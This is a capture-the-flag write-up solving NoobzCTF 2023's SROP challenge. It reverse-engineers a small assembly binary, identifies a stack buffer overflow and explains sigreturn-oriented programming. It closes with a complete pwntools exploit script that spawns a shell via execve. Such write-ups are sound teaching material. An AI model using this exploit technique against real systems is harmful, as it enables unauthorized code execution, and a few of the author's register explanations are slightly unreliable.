<h2> Binary Exploitation </h2>

    - Chall Name: SROP
     - CTF: NoobzCTF

Hi everyone I'll be showing the solution to the SROP challenge from NoobzCTF 2023

Orignally I didn't solve it due to my lack of knowledge of the exploitation technique but I decided to give it a go since I learnt it recently.

### Enumeration 
Ok first thing is always to check the type of file we're dealing with and the protections enabled on it

In this case we're dealing with a 64bits linux executable which is statically linked and not stripped
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/272f7635-60a3-4238-8ed9-69dc3b386377)

And no protections are enabled on this binary :)

I ran the binary to get an overview of what it does and it showed this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/8acf51c0-01b6-4c37-80dd-b68befce9806)

So it seems to print out some text, receive our input then exit

Before I move on forward we should note that when a binary is statically linked, functions that are going to be called by the program would be in the binary which then usually makes the file size much

That case doesn't apply here since the file size is too small (8992 bytes)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/00c15b7d-45b7-41ea-84ce-f9e63b9963b2)

So that means it's likely written in assembly language and compiled rather than it being written in C language

With that said I skipped using Ghidra to decompile it and I used `gdb-gef`

### R3v3rs1ng

I checked the functions available and got this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/7ed0d315-155d-46b9-9023-468ee75e5162)

So we have two functions here which are:
- _start
- vuln

In C language, it's `main()` is equivalent to `_start` in assembly

Now I `disassembled` the `_start` function
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/8d023d3e-3f05-49b6-8e38-12bb149eaa6d)

Here's what it does:
- First it calls the `vuln` function
- Then it sets up the register in order to call `exit(0)`

Nothing much here is done but incase you want it's C equivalent that's the code below!

```c
#include <stdlib.h>

int _start(){
    exit(0);
}
```

This means the good stuff would be in the `vuln` function so I `disassembled` it
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/05e74a14-85c9-4fa0-9783-57e6bc302680)

If you aren't familiar with assembly this might look intimidating but I'll explain what it does here!

The first set of instruction it does is this:
- write(1, "Hello, world!!\n", 15)

```
mov    eax, 0x1
mov    edi,0x1
movabs    rsi,0x402000
mov    edx, 0xf
syscall
```

So it moves `1` to the `eax` register and eventually it does a syscall

In Linux system calls (syscall) are the way that you can make requests from user space into the Linux kernel.

This case when you trigger a syscall it will lookup the rax/eax register as to what it's value is then get it's syscall name 

In our case since the `eax` register isn't modified before the first syscall that means it's attempting to call `write()`
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/b4022b5e-375a-440a-8121-ddf76f7ce250)

You can check out the list of syscalls [here](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86_64-64_bit)

And because it want's to call `write()`, it needs to setup the registers which is the way arguments are passed in `x64 binary` needed for `write()` to work which are:
```
- RDI --> File Descriptor
- RSI --> Address of buffer
- RDX --> Size
```

So in our case it moves the value of `0x1` to the `edi` register (Note: `edi` is the 32bits representation of the `rdi` register) 

And `0x1` which is the file descriptor stands for `standard output -> stdout`

Then it moves the address of `0x402000` to the `rsi` register, that address would be pointing to a string of the binary which we can confirm by examining it's content from `gdb`
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/09426b6b-688d-4803-8e7e-4683c347b6d0)

```
0x402000:       "Hello, world!!\n/bin/sh"
```

Notice that the value stored in that address is pretty long and luckily for us it contains the `/bin/sh` string which we would find useful soon!

The last thing it does is that it moves the value `0xf -> 15` to the `edx` register which signifies that we want to `write` to `stdout` the fist `15 bytes` of the string from the `address -> 0x402000`

So that's settled now!

Let's move on to the last instruction

```
sub    rsp,0x20
mov    eax,0x0
mov    edi,0x0
mov    rsi,rsp
mov    edx,0x200
syscall
```

From the current `stack address` it subtracts `32 bytes` and moves the value of `0x1` to the `eax` register, moves `0x0` to the `edi` register, moves the `stack address` to the `rsi` register, moves `0x200` to the `edx` register then triggers the `syscalls`

Since the `eax` register wasn't modified before the call to `syscall` it therefores triggers `read()`
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/d8178155-cc3b-4dbb-b982-c5a3dc9bde22)

Similarly to `write()` it expects the same thing for the arguments: 

```
RDI -> 0x0 -> Standard Input (stdin)
RSI -> $RSP -> Stores our input on the stack
RDX -> 0x200 -> Size
```

Now what's wrong with this code?

Well the number of bytes created on the stack for where our input will be stored is 24 but when calling `read()` it's size is specified as 512 meaning that it will allow us read in at most 512 bytes stored in a buffer that can only hold up 24 bytes

So we have a classic buffer overflow here. What next?

### Expl0it4t10n

Since we have a buffer overflow I decided to just [ROP](https://en.wikipedia.org/wiki/Return-oriented_programming) and spawn a shell but before I think about ropping I needed to get the offset needed to overwrite the instruction pointer (RIP)

I used `gdb-gef` for it
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/095fe011-8337-41dc-bdfd-8922cc4b044b)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/a3ab2145-d4c6-4047-9901-02f5a0dce32b)

The offset is 32!

Now I looked for ROP gadgets using [ropper](https://github.com/sashs/Ropper) 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/edf6c25d-0332-43a8-8c4f-62721c58a6d8)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/117dbfcb-3b20-4fd6-aa72-6211d168ffc8)

But from looking at the result I didn't see gadgets I was looking for like gadgets that let's me control the `rax, rdi, rsi, rdx` register 

This is bad because those are needed as the argument of a syscall

At least we have a `syscall` gadget, but what can we do with it?

We can leverage a technique called `Sigreturn Orientated Programming (SROP)`

The condition over this technique are:
- A very large overflow with no shortage of space.
- Control over the `RAX` register which allows the specification of a syscall number.
- Access to a syscall instruction.
- The string `/bin/sh` is present within the binary.
- Control over the Stack Frame's saved return address; this translates to control over the stack itself.

From the conditions needed we only meet 4 of them with the exception of the second condition which is the control over the `rax` register

But is that really a problem?

I looked at the [manual](https://man7.org/linux/man-pages/man2/read.2.html) for `read()` (because that's the only time where we can give in our input) and I read the manual

While reading it something caught my attention
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/5ab3747d-1f7c-44a9-b74b-138bf8ba6f40)

```
On success, the number of bytes read is returned
```

This means that the number of bytes of whatever we give as input is the return value

And the return value of a function is stored in the `rax` register

This basically means we can control the `rax` register without needing a gadget 🙂

To confirm that I set a breakpoint after the `read() syscall` and I gave input value as `newbie pwner`
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/dde1509c-e122-4e68-8d8f-f64df8f1a352)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/1aac68b0-7bc4-44c7-99c0-41e3f8ba1a70)

We can see that the current value of the `rax` register is `0xd = 13` but the length of our input is `12`, the reason why `rax == 13` is because of the newline character was read as a string 😕

So in the future of writing the exploit, to avoid problems I wouldn't use `sendline()` 

Before performing the sigreturn syscall, the following Signal Frame needs to be present on the stack
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/992a8d27-36de-4034-8eb5-854f56a425af)

Luckily with pwntools we can make use of the `SigreturnFrame` to create the Signal Frame needed on the stack

The end goal is for me to call `execve('/bin/sh', 0x0, 0x0)` to spawn a shell

For that we need to set:
- rax: 0x3b
- rdi: address pointing to '/bin/sh'
- rsi: 0x0
- rdx: 0x0

Incase you are wondering where those values are from well that's the syscall number for `execve`
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/c23fb455-1e5a-4383-a07f-b6d9eb7c2402)

Since I'm not passing any parameter to `/bin/sh` I set `rsi & rdx` to `0`

As for the address of `/bin/sh` remember that we initially saw it as the `rsi` value used when `write` was called
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/634056bb-351d-4393-9762-c665fcbaf730)

To get the value of `/bin/sh` I just need to add that address with `15`
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/165b4c26-404a-4bc0-9855-7cc449f854cb)

Finally the attack strategy would be:
- Overwrite the rip to call `vuln()` again thereby giving us another call to `read()`
- Send in 15 bytes as the input in order to make the `rax` equal `15`
- The next flow of execution would be setting up the fake signal frame and giving us full control over the executable
- Spawnning a shell and that's profit!

Here's my exploit script:

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'chall')
elf = exe
filterwarnings("ignore")
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
break *vuln+55
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io
    global elf

    io = start()

def srop():
    offset = 32
    syscall = 0x0000000000401047 # syscall; ret;
    nbytes = b'A'*15
    sh = 0x402000+0xf # "/bin/sh"


    payload = flat({
        offset: [
            elf.sym['vuln'],
            syscall
        ]
    })

    frame = SigreturnFrame()
    frame.rax = 0x3b
    frame.rdi = sh
    frame.rsi = 0x0
    frame.rdx = 0x0
    
    frame.rip = syscall

    payload += bytes(frame)

    io.sendline(payload)
    io.sendafter(b'world!!', nbytes)


def main():
    
    init()
    srop()
    
    io.interactive()

if __name__ == '__main__':
    main()
```




































